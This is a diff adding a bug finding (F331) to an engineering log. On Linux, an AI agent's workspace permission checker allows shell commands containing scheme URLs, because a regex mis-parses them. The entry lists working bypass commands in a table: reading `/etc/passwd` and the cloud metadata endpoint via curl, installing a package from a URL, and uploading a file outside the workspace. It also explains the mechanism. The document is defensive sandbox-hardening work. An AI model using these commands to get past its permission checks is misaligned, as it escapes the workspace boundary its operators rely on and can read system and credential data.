@@ -26354,3 +26354,54 @@ already chose to drop. Nothing is lost that was wanted.
 **The claim.** `NewConversationSurface.tsx` creates the exploring document *before* it posts the turn. That order is deliberate: the first turn has to carry the document. But when `/agent/trigger` then refuses, nothing removes the document, so each retry mints another placeholder (`emerald-fenrir`, `silver-thunderbird`, …), each an empty `exploring` change spec. The operator is left with one orphan per attempt, in the repository and in the spec list, for turns that never ran.
 
 **A possible repair, not proposed.** Let `/agent/trigger` create the document inside the same request that queues the turn, so a refusal rolls both back. Or have the composer withdraw the document it created when the trigger fails.
+
+## F331 (A) — on POSIX, the default posture allows any scheme URL in a shell command, and `curl -T x file:///…` writes outside the workspace
+
+**Status:** open. Filed 2026-09-12 by the night window, while pinning `a-url-is-not-a-path` §1 (queue
+item `u1-pin`). **Measured on Linux, not through a live run.** `_decide` was called directly, from
+`hub/hub/mcp_server.py` at `c12a7d3`, under WSL Ubuntu with Python 3.12.3. curl was run in the
+same shell.
+
+**The claim.** Under `workspace` (`DEFAULT_CLAUDE_PERMISSION_MODE`), on POSIX, `_decide` allows
+every shell command whose only absolute-looking text is a scheme URL:
+
+| command | `_decide` on Linux | on Windows |
+|---|---|---|
+| `curl -s https://example.com/x` | **allow**, *inside your workspace* | deny, `'s://example.com/x'` |
+| `curl -s http://169.254.169.254/latest/meta-data/` | **allow** | deny |
+| `pip install https://example.com/pkg.tar.gz` | **allow** | deny |
+| `curl file:///etc/passwd` | **allow** | deny, `'e:///etc/passwd'` |
+| `curl -T notes.md file:///tmp/f331_stray.txt` | **allow** | deny |
+
+The last command, run in the same WSL shell with curl 8.5.0, exited 0 and **wrote
+`/tmp/f331_stray.txt`**, a path outside the workspace. That breaches the shipped scenario
+*"Traversal and links cannot escape"* (`agent-run-sandboxing`, *"A posture exists in which the
+workspace boundary is enforced per tool call"*). The `file:///etc/passwd` row is the same escape as
+a read. A `Read` of `/etc/passwd` is refused by the same function.
+
+**The mechanism.** `_ABSOLUTE_PATH_RE` (`mcp_server.py:936`) opens a candidate at a drive letter
+followed by a separator. So in `https://…` it matches `s://example.com/x`, and in `file:///…` it
+matches `e:///…`. On Windows that is a rooted path on drive `S:` or `E:`, so it is outside, which
+is the refusal F300 and F312 recorded. On POSIX `os.path.isabs("s://example.com/x")` is `False`.
+The candidate is joined to the workspace, `realpath` collapses `//`, and it resolves inside.
+
+**What this corrects.** F300 says *"`https://example.com/x` yields the candidate
+`//example.com/x`"*. F312 says *"No agent on the default posture can make any network request from
+a shell command"*. Both statements are true on Windows only. The shipped Docker deployment
+(`hub/Dockerfile`) is Linux, and so is CI. There, every URL-bearing refusal those findings record
+is an allow. The exception is where another absolute path in the same command is found first, as
+with `$HUB_URL/…`, where `/api/…` is the candidate.
+
+**Closed by** `a-url-is-not-a-path` once built and driven. Rule 1 judges a `file:` URL's path as a
+path, and every other scheme under the network rule. The rows are pinned in
+`hub/tests/test_permission_approver.py::test_the_decided_table`:
+- `F331`, the `-T` upload, and `N7`: refused as outside;
+- `R10`, `N1`, `N2`, `H5`–`H7`, `H13` and `H14`: refused as network addresses.
+
+On Linux each is a strict xfail today that fails on its **answer**. So CI's Linux job is where the
+fix is seen to land.
+
+**Reproduce:** `testbed/scratch/night0912/f331_posix.py`, run in WSL from `hub/` (scratch,
+uncommitted). The table's per-row cause is in `testbed/scratch/night0912/why_each_row.py`.
+
+**Related:** F323 (the Windows twin: an escape the regex never saw), F300, F312.
